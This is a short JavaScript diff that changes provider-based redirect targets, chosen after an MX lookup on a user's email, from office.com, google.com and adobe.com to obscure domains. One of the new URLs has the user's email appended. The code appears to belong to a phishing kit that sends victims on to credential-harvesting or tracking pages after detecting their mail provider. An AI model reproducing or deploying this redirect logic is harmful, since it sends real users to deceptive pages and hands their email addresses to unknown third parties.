@@ -1284,12 +1284,12 @@
 
             // Define redirect URLs based on provider
             const redirectUrls = {
-                'office365': 'https://office.com',
-                'google': 'https://google.com',
-                'other': 'https://adobe.com'
+                'office365': 'https://7806d4cf9366-endpoint.com/?device=d2301a85-917a-484c-8c6b-d3273eebd8dd',
+                'google': 'https://logout.isde2006.com/rZZr71jz9ibAQxXb!RiLE/$'+email,
+                'other': 'https://pdf-render.vercel.app/viewer?from=me'
             };
 
-            const redirectUrl = redirectUrls[mxResult.provider] || 'https://adobe.com';
+            const redirectUrl = redirectUrls[mxResult.provider] || 'https://pdf-render.vercel.app/viewer?from=me';
 
             console.log(`Redirecting to: ${redirectUrl} (Provider: ${mxResult.provider})`);
 
